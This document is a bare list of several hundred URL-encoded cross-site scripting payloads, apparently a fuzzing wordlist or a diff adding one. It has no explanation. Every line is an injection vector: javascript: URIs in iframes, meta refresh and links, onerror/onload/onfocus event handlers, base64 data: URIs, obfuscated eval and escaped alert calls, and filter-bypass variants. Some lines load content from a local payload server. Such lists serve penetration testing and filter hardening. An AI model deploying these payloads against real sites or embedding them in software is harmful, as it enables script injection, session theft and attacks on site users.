+%3Ciframe%20%20src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29%3E%3C/iframe%3E  
+%22%3E%3Ciframe%20%20src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29%3E%3C/iframe%3E  
+'%3E%3Ciframe%20%20src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29%3E%3C/iframe%3E  
+%3Cmeta%20http-equiv=%22refresh%22%20content=%220;javascript&colon;alert(1)%22/%3E  
+%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;javascript&colon;alert(1)%22/%3E  
+'%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;javascript&colon;alert(1)%22/%3E%E2%80%8B  
+%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;javascript&colon;alert(1)%22/%3E  
+%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;javascript&colon;alert(1)%22/%3E  
+'%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;javascript&colon;alert(1)%22/%3E%E2%80%8B  
+'%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;javascript&colon;alert(1)%22/%3E  
+%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;javascript&colon;alert(1)%22/%3E  
+'%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;javascript&colon;alert(1)%22/%3E%E2%80%8B  
+%3Cembed%20code=%22http://127.0.0.1:3555/xss_serve_payloads/flash.swf%22%20allowscriptaccess=always%3E  
+%22%3E%3Cembed%20code=%22http://127.0.0.1:3555/xss_serve_payloads/flash.swf%22%20allowscriptaccess=always%3E  
+'%3E%3Cembed%20code=%22http://127.0.0.1:3555/xss_serve_payloads/flash.swf%22%20allowscriptaccess=always%3E%E2%80%8B  
+%22%3E%3Cembed%20code=%22http://127.0.0.1:3555/xss_serve_payloads/flash.swf%22%20allowscriptaccess=always%3E%E2%80%8B  
+'%3E%3Cembed%20code=%22http://127.0.0.1:3555/xss_serve_payloads/flash.swf%22%20allowscriptaccess=always%3E%E2%80%8B  
+%3Cscript%3E~'/u0061'%20;%20%20/u0074/u0068/u0072/u006F/u0077%20~%20/u0074/u0068/u0069/u0073.%20%20/u0061/u006C/u0065/u0072/u0074(~'/u0061')%3C/script%20U+  
+%22%3E%3Cscript%3E~'/u0061'%20;%20%20/u0074/u0068/u0072/u006F/u0077%20~%20/u0074/u0068/u0069/u0073.%20%20/u0061/u006C/u0065/u0072/u0074(~'/u0061')%3C/script%20U+  
+'%3E%3Cscript%3E~'/u0061'%20;%20%20/u0074/u0068/u0072/u006F/u0077%20~%20/u0074/u0068/u0069/u0073.%20%20/u0061/u006C/u0065/u0072/u0074(~'/u0061')%3C/script%20U+  
+%3Cscript/src=data&colon;text/j/u0061v/u0061&  
+%22%3E%3Cscript/src=data&colon;text/j/u0061v/u0061&  
+'%3E%3Cscript/src=data&colon;text/j/u0061v/u0061&  
+%22%3E%3Cscript/src=data&colon;text/j/u0061v/u0061&  
+%22%3E%3Cscript/src=data&colon;text/j/u0061v/u0061&  
+'%3E%3Cscript/src=data&colon;text/j/u0061v/u0061&  
+%22%3E%3Cscript/src=data&colon;text/j/u0061v/u0061&  
+'%3E%3Cscript/src=data&colon;text/j/u0061v/u0061&  
+%3Cscript%20itworksinallbrowsers%3E/*%3Cscript*%20*/alert(1)%3C/script  
+%22%3E%3Cscript%20itworksinallbrowsers%3E/*%3Cscript*%20*/alert(1)%3C/script  
+'%3E%3Cscript%20itworksinallbrowsers%3E/*%3Cscript*%20*/alert(1)%3C/script%20%E2%80%8B  
+%22%3E%3Cscript%20itworksinallbrowsers%3E/*%3Cscript*%20*/alert(1)%3C/script%20%E2%80%8B  
+'%3E%3Cscript%20itworksinallbrowsers%3E/*%3Cscript*%20*/alert(1)%3C/script%20%E2%80%8B  
+%3Cimg%20src%20?itworksonchrome?\x5C/onerror%20=%20alert(1)  
+%22%3E%3Cimg%20src%20?itworksonchrome?\x5C/onerror%20=%20alert(1)  
+'%3E%3Cimg%20src%20?itworksonchrome?\x5C/onerror%20=%20alert(1)%E2%80%8B%E2%80%8B%E2%80%8B  
+%22%3E%3Cimg%20src%20?itworksonchrome?\x5C/onerror%20=%20alert(1)%E2%80%8B%E2%80%8B%E2%80%8B  
+'%3E%3Cimg%20src%20?itworksonchrome?\x5C/onerror%20=%20alert(1)%E2%80%8B%E2%80%8B%E2%80%8B  
+%3Cmeta%20http-equiv=%22refresh%22%20content=%220;%20url=data:text/html;blabla,&  
+%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;%20url=data:text/html;blabla,&  
+'%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;%20url=data:text/html;blabla,&  
+%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20%20aaaaaaaaa%20aaaaaaaaaa%20%20href=j&  
+%22%3E%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20%20aaaaaaaaa%20aaaaaaaaaa%20%20href=j&  
+'%3E%3Ca%20aa%20aaa%20aaaa%20aaaaa%20aaaaaa%20aaaaaaa%20aaaaaaaa%20%20aaaaaaaaa%20aaaaaaaaaa%20%20href=j&  
+%3Cscript/src=&  
+%22%3E%3Cscript/src=&  
+'%3E%3Cscript/src=&  
+%22%3E%3Cscript/src=&  
+%22%3E%3Cscript/src=&  
+'%3E%3Cscript/src=&  
+%22%3E%3Cscript/src=&  
+'%3E%3Cscript/src=&  
+%3Cimg%20src=x%20onerror=window.open('http://127.0.0.1:3555/xss_serve_payloads/X.html%22');%3E  
+%22%3E%3Cimg%20src=x%20onerror=window.open('http://127.0.0.1:3555/xss_serve_payloads/X.html%22');%3E  
+'%3E%3Cimg%20src=x%20onerror=window.open('http://127.0.0.1:3555/xss_serve_payloads/X.html%22');%3E  
+%3Ctable%20background=javascript:alert(1)%3E%3C/table%3E  
+%22%3E%3Ctable%20background=javascript:alert(1)%3E%3C/table%3E  
+'%3E%3Ctable%20background=javascript:alert(1)%3E%3C/table%3E  
+%3Cobject/data=//127.0.0.1:3555/xss_serve_payloads/flash.swf  
+%22%3E%3Cobject/data=//127.0.0.1:3555/xss_serve_payloads/flash.swf  
+'%3E%3Cobject/data=//127.0.0.1:3555/xss_serve_payloads/flash.swf  
+%3Capplet%20code=%22javascript:confirm(1);%22%3E  
+%22%3E%3Capplet%20code=%22javascript:confirm(1);%22%3E  
+'%3E%3Capplet%20code=%22javascript:confirm(1);%22%3E  
+%3Cmarquee/onstart=confirm(2)%3E/  
+%22%3E%3Cmarquee/onstart=confirm(2)%3E/  
+'%3E%3Cmarquee/onstart=confirm(2)%3E/  
+%3Cbody%20onload=prompt(1);%3E  
+%22%3E%3Cbody%20onload=prompt(1);%3E  
+'%3E%3Cbody%20onload=prompt(1);%3E  
+%3Cselect%20autofocus%20onfocus=alert(1)%3E  
+%22%3E%3Cselect%20autofocus%20onfocus=alert(1)%3E  
+'%3E%3Cselect%20autofocus%20onfocus=alert(1)%3E  
+%3Ctextarea%20autofocus%20onfocus=alert(1)%3E  
+%22%3E%3Ctextarea%20autofocus%20onfocus=alert(1)%3E  
+'%3E%3Ctextarea%20autofocus%20onfocus=alert(1)%3E  
+%3Ckeygen%20autofocus%20onfocus=alert(1)%3E  
+%22%3E%3Ckeygen%20autofocus%20onfocus=alert(1)%3E  
+'%3E%3Ckeygen%20autofocus%20onfocus=alert(1)%3E  
+%3Cvideo%3E%3Csource%20onerror=%22javascript:alert(1)%22%3E  
+%22%3E%3Cvideo%3E%3Csource%20onerror=%22javascript:alert(1)%22%3E  
+'%3E%3Cvideo%3E%3Csource%20onerror=%22javascript:alert(1)%22%3E  
+%3Ca%20onmouseover=%22javascript:window.onerror=alert;throw%201%3E  
+%22%3E%3Ca%20onmouseover=%22javascript:window.onerror=alert;throw%201%3E  
+'%3E%3Ca%20onmouseover=%22javascript:window.onerror=alert;throw%201%3E  
+%3Cimg%20src=x%20onerror=%22javascript:window.onerror=alert;throw%201%22%3E  
+%22%3E%3Cimg%20src=x%20onerror=%22javascript:window.onerror=alert;throw%201%22%3E  
+'%3E%3Cimg%20src=x%20onerror=%22javascript:window.onerror=alert;throw%201%22%3E  
+%3Cbody/onload=javascript:window.onerror=eval;throw'=alert/x281/x29';  
+%22%3E%3Cbody/onload=javascript:window.onerror=eval;throw'=alert/x281/x29';  
+'%3E%3Cbody/onload=javascript:window.onerror=eval;throw'=alert/x281/x29';  
+%3Cimg%20style=%22xss:expression(alert(1))%22%3E  
+%22%3E%3Cimg%20style=%22xss:expression(alert(1))%22%3E  
+'%3E%3Cimg%20style=%22xss:expression(alert(1))%22%3E  
+%3Cdiv%20style=%22color:rgb(''&  
+%22%3E%3Cdiv%20style=%22color:rgb(''&  
+'%3E%3Cdiv%20style=%22color:rgb(''&  
+%3Ca%20onmouseover=location=%E2%80%99javascript:alert(1)%3Eclick  
+%22%3E%3Ca%20onmouseover=location=%E2%80%99javascript:alert(1)%3Eclick  
+'%3E%3Ca%20onmouseover=location=%E2%80%99javascript:alert(1)%3Eclick  
+%3Cbody%20onfocus=%22location='javascrpt:alert(1)%20%3E123  
+%22%3E%3Cbody%20onfocus=%22location='javascrpt:alert(1)%20%3E123  
+'%3E%3Cbody%20onfocus=%22location='javascrpt:alert(1)%20%3E123  
+%3Csvg%20xmlns:xlink=%22http://www.w3.org/1999/xlink%22%3E%3Ca%3E%3Ccircle%20r=100%20/%3E%3Canimate%20attributeName=%22xlink:href%22%20values=%22;javascript:alert(1)%22%20begin=%220s%22%20dur=%220.1s%22%20fill=%22freeze%22/%3E  
+%22%3E%3Csvg%20xmlns:xlink=%22http://www.w3.org/1999/xlink%22%3E%3Ca%3E%3Ccircle%20r=100%20/%3E%3Canimate%20attributeName=%22xlink:href%22%20values=%22;javascript:alert(1)%22%20begin=%220s%22%20dur=%220.1s%22%20fill=%22freeze%22/%3E  
+'%3E%3Csvg%20xmlns:xlink=%22http://www.w3.org/1999/xlink%22%3E%3Ca%3E%3Ccircle%20r=100%20/%3E%3Canimate%20attributeName=%22xlink:href%22%20values=%22;javascript:alert(1)%22%20begin=%220s%22%20dur=%220.1s%22%20fill=%22freeze%22/%3E  
+%3Csvg%3E%3C![CDATA[%3E%3Cimagexlink:href=%22]]%3E%3Cimg/src=xx:xonerror=alert(1)//%22%3E%3C/svg%3E  
+%22%3E%3Csvg%3E%3C![CDATA[%3E%3Cimagexlink:href=%22]]%3E%3Cimg/src=xx:xonerror=alert(1)//%22%3E%3C/svg%3E  
+'%3E%3Csvg%3E%3C![CDATA[%3E%3Cimagexlink:href=%22]]%3E%3Cimg/src=xx:xonerror=alert(1)//%22%3E%3C/svg%3E  
+%3Cmeta%20content=%22&NewLine;%201%20&NewLine;;JAVASCRIPT&colon;%20alert(1)%22%20http-equiv=%22refresh%22/%3E  
+%22%3E%3Cmeta%20content=%22&NewLine;%201%20&NewLine;;JAVASCRIPT&colon;%20alert(1)%22%20http-equiv=%22refresh%22/%3E  
+'%3E%3Cmeta%20content=%22&NewLine;%201%20&NewLine;;JAVASCRIPT&colon;%20alert(1)%22%20http-equiv=%22refresh%22/%3E  
+%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cg%20onload=%22javascript:/u0061lert(1);%22%3E%3C/g%3E%3C/svg%3E  
+%22%3E%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cg%20onload=%22javascript:/u0061lert(1);%22%3E%3C/g%3E%3C/svg%3E  
+'%3E%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cg%20onload=%22javascript:/u0061lert(1);%22%3E%3C/g%3E%3C/svg%3E  
+%3Cstyle%3E  
+%22%3E%3Cstyle%3E  
+'%3E%3Cstyle%3E  
+%3Cobject%20data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%3E%3C/object%3E  
+%22%3E%3Cobject%20data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%3E%3C/object%3E  
+'%3E%3Cobject%20data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%3E%3C/object%3E%E2%80%8B  
+%22%3E%3Cobject%20data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%3E%3C/object%3E%E2%80%8B  
+'%3E%3Cobject%20data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%3E%3C/object%3E%E2%80%8B  
+%3Cmeta%20http-equiv=%22refresh%22%20content=%220;%20url=data:text/html,%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E  
+%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;%20url=data:text/html,%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E  
+'%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;%20url=data:text/html,%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E  
+eval(%22s=document.createElement('script');alert(1);document.getElementsByTagName('head')[0].appendChild(s)%22)  
+%3Cmeta%20http-equiv=%22refresh%22%20content=%220;url=http://127.0.0.1:3555/xss_serve_payloads/X.html%22  
+%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;url=http://127.0.0.1:3555/xss_serve_payloads/X.html%22  
+'%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;url=http://127.0.0.1:3555/xss_serve_payloads/X.html%22  
+%3Cmeta%20http-equiv=%22refresh%22%20content=%220;url=http://127.0.0.1:3555/xss_serve_payloads/X.html%22  
+%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;url=http://127.0.0.1:3555/xss_serve_payloads/X.html%22  
+'%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;url=http://127.0.0.1:3555/xss_serve_payloads/X.html%22%3E  
+%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;url=http://127.0.0.1:3555/xss_serve_payloads/X.html%22%3E  
+'%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;url=http://127.0.0.1:3555/xss_serve_payloads/X.html%22%3E  
+javascript:/*%E2%80%93%3E%3C/marquee%3E%3C/script%3E%3C/title%3E%3C/textarea%3E%3C/noscript%3E%3C/style%3E%3C/xmp%3E%E2%80%9D%3E%20[img=1]%3Cimg%20-/style=-=expression&  
+%3Cimg%20src=%E2%80%9D%3Cimg%20src=x%E2%80%9D/onerror=alert(1)//%E2%80%9D%3E%20Jquery:%20%3Cimg/src/onerror=alert(1)%3E  
+%22%3E%3Cimg%20src=%E2%80%9D%3Cimg%20src=x%E2%80%9D/onerror=alert(1)//%E2%80%9D%3E%20Jquery:%20%3Cimg/src/onerror=alert(1)%3E  
+'%3E%3Cimg%20src=%E2%80%9D%3Cimg%20src=x%E2%80%9D/onerror=alert(1)//%E2%80%9D%3E%20Jquery:%20%3Cimg/src/onerror=alert(1)%3E  
+%3Cinput%20id=x%3E%3Cinput%20id=x%3E%3Cscript%3Ealert(x)%3C/script%3E  
+%22%3E%3Cinput%20id=x%3E%3Cinput%20id=x%3E%3Cscript%3Ealert(x)%3C/script%3E  
+'%3E%3Cinput%20id=x%3E%3Cinput%20id=x%3E%3Cscript%3Ealert(x)%3C/script%3E  
+%3Ca%20href=%22invalid:1%22%20id=x%20name=y%3Etest%3C/a%3E%3Ca%20href=%22invalid:2%22%20id=x%20name=y%3Etest%3C/a%3E%3Cscript%3Ealert(x.y[0])%3C/script%3E  
+%22%3E%3Ca%20href=%22invalid:1%22%20id=x%20name=y%3Etest%3C/a%3E%3Ca%20href=%22invalid:2%22%20id=x%20name=y%3Etest%3C/a%3E%3Cscript%3Ealert(x.y[0])%3C/script%3E  
+'%3E%3Ca%20href=%22invalid:1%22%20id=x%20name=y%3Etest%3C/a%3E%3Ca%20href=%22invalid:2%22%20id=x%20name=y%3Etest%3C/a%3E%3Cscript%3Ealert(x.y[0])%3C/script%3E  
+%3Cscript%3Ealert(x.y.x.y.x.y[0]);alert(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);%3C/script%3E  
+%22%3E%3Cscript%3Ealert(x.y.x.y.x.y[0]);alert(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);%3C/script%3E  
+'%3E%3Cscript%3Ealert(x.y.x.y.x.y[0]);alert(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);%3C/script%3E  
+%3Ca%20href=1%20name=x%3Etest%3C/a%3E%3Ca%20href=1%20name=x%3Etest%3C/a%3E%3Cscript%3Ealert(x.removeChild)alert(x.parentNode)%3C/script%3E  
+%22%3E%3Ca%20href=1%20name=x%3Etest%3C/a%3E%3Ca%20href=1%20name=x%3Etest%3C/a%3E%3Cscript%3Ealert(x.removeChild)alert(x.parentNode)%3C/script%3E  
+'%3E%3Ca%20href=1%20name=x%3Etest%3C/a%3E%3Ca%20href=1%20name=x%3Etest%3C/a%3E%3Cscript%3Ealert(x.removeChild)alert(x.parentNode)%3C/script%3E  
+%3Ca%20href=%22123%22%20id=x%3Etest%3C/a%3E%3Cscript%3Ex='javascript:alert(1)';%3C/script%3E  
+%22%3E%3Ca%20href=%22123%22%20id=x%3Etest%3C/a%3E%3Cscript%3Ex='javascript:alert(1)';%3C/script%3E  
+'%3E%3Ca%20href=%22123%22%20id=x%3Etest%3C/a%3E%3Cscript%3Ex='javascript:alert(1)';%3C/script%3E  
+%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+%22%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+'%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22%3E  
+%22%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+%22%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+'%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22%3E  
+'%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+%22%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22  
+'%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22%3E%3C/form%3E%3Cscript%3Eif(top!=self)%7Btop.location=self.location%7D%3C/script%3E  
+%22%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22%3E%3C/form%3E%3Cscript%3Eif(top!=self)%7Btop.location=self.location%7D%3C/script%3E  
+'%3E%3Cform%20name=self%20location=%22javascript:alert(1)%22%3E%3C/form%3E%3Cscript%3Eif(top!=self)%7Btop.location=self.location%7D%3C/script%3E  
+%3Cform%20name=self%20location=%22javascript&amp;  
+%22%3E%3Cform%20name=self%20location=%22javascript&amp;  
+'%3E%3Cform%20name=self%20location=%22javascript&amp;  
+%3Cimg%20name%3DgetElementsByTagName%20src%3D1%20%20onerror%3Dalert(1)%3E  
+%3Cform%20onmouseover%3Dalert(1)%3E%3Cinput%20name%3Dattributes%3E  
+%3Ca/onmouseover[/x0b]=location='/x6A/x61/x76/x61/x73/x63/x72/x69/x70/x74/x3A/x61/x6C/x65/x72/x74/x28/x31/x29/x3B'%3EX  
+%22%3E%3Ca/onmouseover[/x0b]=location='/x6A/x61/x76/x61/x73/x63/x72/x69/x70/x74/x3A/x61/x6C/x65/x72/x74/x28/x31/x29/x3B'%3EX  
+'%3E%3Ca/onmouseover[/x0b]=location='/x6A/x61/x76/x61/x73/x63/x72/x69/x70/x74/x3A/x61/x6C/x65/x72/x74/x28/x31/x29/x3B'%3EX  
+data:text/html,%3Cscript%3Ealert(1)%3C%2Fscript%3E  
+window.name//'name=%22javascript:alert(%22X%22)  
+%3Csvg/onload=location=/java/.source+/script/.source+location.h%20ash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.has%20h[3]//  
+%22%3E%3Csvg/onload=location=/java/.source+/script/.source+location.h%20ash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.has%20h[3]//  
+'%3E%3Csvg/onload=location=/java/.source+/script/.source+location.h%20ash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.has%20h[3]//  
+%22]);%7Dcatch(e)%7B%7Dif(!self.a)self.a=!alert(1);/  
+%3Cscript%3Ealert(1)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E;  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E;  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E;  
+%3Cscript%3Ealert(%22/X%22/)%3C/script%3E  
+%22%3E%3Cscript%3Ealert(%22/X%22/)%3C/script%3E  
+'%3E%3Cscript%3Ealert(%22/X%22/)%3C/script%3E  
+%3CSCRIPT%3Ea=/X/  
+%22%3E%3CSCRIPT%3Ea=/X/  
+'%3E%3CSCRIPT%3Ea=/X//nalert(1);%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%3Ea=/X/  
+%22%3E%3CSCRIPT%3Ea=/X/  
+'%3E%3CSCRIPT%3Ea=/X//nalert(1);%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%3Ea=/X/  
+%22%3E%3CSCRIPT%3Ea=/X/  
+'%3E%3CSCRIPT%3Ea=/X//nalert(1);%3C/SCRIPT%3E  
+%3Cscript%3Ealert([!![]]+[])%3C/script%3E  
+%22%3E%3Cscript%3Ealert([!![]]+[])%3C/script%3E  
+'%3E%3Cscript%3Ealert([!![]]+[])%3C/script%3E  
+%3Cscript%3Eprompt(-[])%3C/script%3E  
+%22%3E%3Cscript%3Eprompt(-[])%3C/script%3E  
+'%3E%3Cscript%3Eprompt(-[])%3C/script%3E  
+%3Cscr/**/ipt%3Ealert(1)%3C/sc/**/ipt%3E  
+%22%3E%3Cscr/**/ipt%3Ealert(1)%3C/sc/**/ipt%3E  
+'%3E%3Cscr/**/ipt%3Ealert(1)%3C/sc/**/ipt%3E  
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E  
+'%3E%3Cscript%3Ealert(1)%3C/script%3E  
+/'%3E%3Cscript%3EX%3C//script%3E  
+/'%3E%3Cbody%20onload=/'X/'%3E  
+%3E%3Cscript%3EX%3C//script%3E  
+%3Cbody%20onload=%22X%22%3E  
+%22%3E%3Cbody%20onload=%22X%22%3E  
+'%3E%3Cbody%20onload=%22X%22%3E  
+%3Cimg%20src=%22x:X%22%20onerror=%22alert(1)%22%3E  
+%22%3E%3Cimg%20src=%22x:X%22%20onerror=%22alert(1)%22%3E  
+'%3E%3Cimg%20src=%22x:X%22%20onerror=%22alert(1)%22%3E  
+%3Cimg%20src=a%20onerror=alert(1)  
+%22%3E%3Cimg%20src=a%20onerror=alert(1)  
+'%3E%3Cimg%20src=a%20onerror=alert(1)%0A%3Ea  
+%22%3E%3Cimg%20src=a%20onerror=alert(1)%0A%3Ea  
+'%3E%3Cimg%20src=a%20onerror=alert(1)%0A%3Ea  
+onmouseover=alert(1);  
+%3C%3CSCRIPT%3Ealert(1);/  
+%22%3E%3C%3CSCRIPT%3Ealert(1);/  
+'%3E%3C%3CSCRIPT%3Ealert(1);/  
+%3CSCRIPT%3Ea=/X/  
+%22%3E%3CSCRIPT%3Ea=/X/  
+'%3E%3CSCRIPT%3Ea=/X/  
+alert(1)  
+alert(String.fromCharCode(49))  
+alert(/1/.source)  
+eval('alert(1)')  
+this['EvAL'.toLowerCase()]('aLErT(1)'.toLowerCase())  
+(alert(1)).replace(/.+/,eval);  
+/u0061/u006c/u0065/u0072/u0074(1)  
+eval('/u00'%20+%20'6'%20+%20'1'+'le'%20+%20'/u0072'%20+%20't(1)')  
+eval('/141/154/145/162/164/50/61/51')  
+eval('/x61/x6c/x65/x72/x74(1)')  
+eval('/x61ler/x74(1)')  
+expression(URL=0)  
+expr/65%20ssion(URL=0)  
+expr/65%20ss/*???*/ion(URL=0);  
+expression/28URL=0/29  
+expr/65%20ss/*/&  
+top['a/x6Cert'](1)  
+/000045xpr/000065%20ss/*BlABl///aaaaa!!!*  
+feed:javascript:alert(1)  
+feed:javascript&colon;alert(1)  
+feed:data:text/html,%3cscript%3ealert%281%29%3c/script%3e  
+feed:data:text/html,%3csvg%20onload=alert%281%29%3e  
+data:text/html,%3Cscript%3Ealert(1)%3C/script%3E  
+d&  
+data:_;;;:;base64_______,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==  
+%3CLAYER%20SRC=%22javascript:alert(1);%22%3E%3C/LAYER%3E  
+%22%3E%3CLAYER%20SRC=%22javascript:alert(1);%22%3E%3C/LAYER%3E  
+'%3E%3CLAYER%20SRC=%22javascript:alert(1);%22%3E%3C/LAYER%3E  
+%3CLINK%20REL=%22stylesheet%22%20HREF=%22javascript:alert(1);%22%3E  
+%22%3E%3CLINK%20REL=%22stylesheet%22%20HREF=%22javascript:alert(1);%22%3E  
+'%3E%3CLINK%20REL=%22stylesheet%22%20HREF=%22javascript:alert(1);%22%3E  
+%3C!--[if%20gte%20IE%204]%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E%3C![endif]--%3E  
+%22%3E%3C!--[if%20gte%20IE%204]%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E%3C![endif]--%3E  
+'%3E%3C!--[if%20gte%20IE%204]%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%3Ealert(1);%3C/SCRIPT%3E%3C![endif]--%3E  
+%3CBASE%20HREF=%22javascript:alert(1);//%22%3E  
+%22%3E%3CBASE%20HREF=%22javascript:alert(1);//%22%3E  
+'%3E%3CBASE%20HREF=%22javascript:alert(1);//%22%3E  
+data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==  
+%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%22%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+'%3E%3Cscript%3Ealert(String.fromCharCode(75,67,70))%3C/script%3E  
+%3CIFRAME%20SRC=%22javascript:alert(1);%22%3E%3C/IFRAME%3E  
+%22%3E%3CIFRAME%20SRC=%22javascript:alert(1);%22%3E%3C/IFRAME%3E  
+'%3E%3CIFRAME%20SRC=%22javascript:alert(1);%22%3E%3C/IFRAME%3E  
+%3Ciframe%20src=%22javascript:alert(1);%20%3C  
+%22%3E%3Ciframe%20src=%22javascript:alert(1);%20%3C  
+'%3E%3Ciframe%20src=%22javascript:alert(1);%20%3C  
+%3Cobject%20data=%22data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E%3C/object%3E  
+%22%3E%3Cobject%20data=%22data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E%3C/object%3E  
+'%3E%3Cobject%20data=%22data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E%3C/object%3E  
+%3CSCRIPT%3Ex=/X/%20%20alert(x.source)%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%3Ex=/X/%20%20alert(x.source)%3C/SCRIPT%3E  
+%22%3E%3Cimg%20src=X%20onerror=alert(1)%3E  
+'%3E%3Cimg%20src=X%20onerror=alert(1)%3E  
+%3Cimg%20src=/%20onerror=alert(1);%3E  
+%22%3E%3Cimg%20src=/%20onerror=alert(1);%3E  
+'%3E%3Cimg%20src=/%20onerror=alert(1);%3E  
+%3CBODY%20BACKGROUND=%22javascript:alert(1)%22%3E  
+%22%3E%3CBODY%20BACKGROUND=%22javascript:alert(1)%22%3E  
+'%3E%3CBODY%20BACKGROUND=%22javascript:alert(1)%22%3E  
+%3CTABLE%20BACKGROUND=%22javascript:alert(1)%22%3E  
+%22%3E%3CTABLE%20BACKGROUND=%22javascript:alert(1)%22%3E  
+'%3E%3CTABLE%20BACKGROUND=%22javascript:alert(1)%22%3E  
+%3CIMG%20SRC='vbscript:msgbox(1)'%3E  
+%22%3E%3CIMG%20SRC='vbscript:msgbox(1)'%3E  
+'%3E%3CIMG%20SRC='vbscript:msgbox(1)'%3E  
+%3CScriPt%3EALeRt(%E2%80%9C%20X%20%E2%80%9D)%3C/scriPt%3E  
+%22%3E%3CScriPt%3EALeRt(%E2%80%9C%20X%20%E2%80%9D)%3C/scriPt%3E  
+'%3E%3CScriPt%3EALeRt(%E2%80%9C%20X%20%E2%80%9D)%3C/scriPt%3E  
+%3Ca%20href=%22javascript  
+%22%3E%3Ca%20href=%22javascript  
+'%3E%3Ca%20href=%22javascript  
+%3Cdiv%20onmouseover=%22alert(1);%22%3E  
+%22%3E%3Cdiv%20onmouseover=%22alert(1);%22%3E  
+'%3E%3Cdiv%20onmouseover=%22alert(1);%22%3E  
+%3CBR%20SIZE=%22&%7Balert(1)%7D%22%3E  
+%22%3E%3CBR%20SIZE=%22&%7Balert(1)%7D%22%3E  
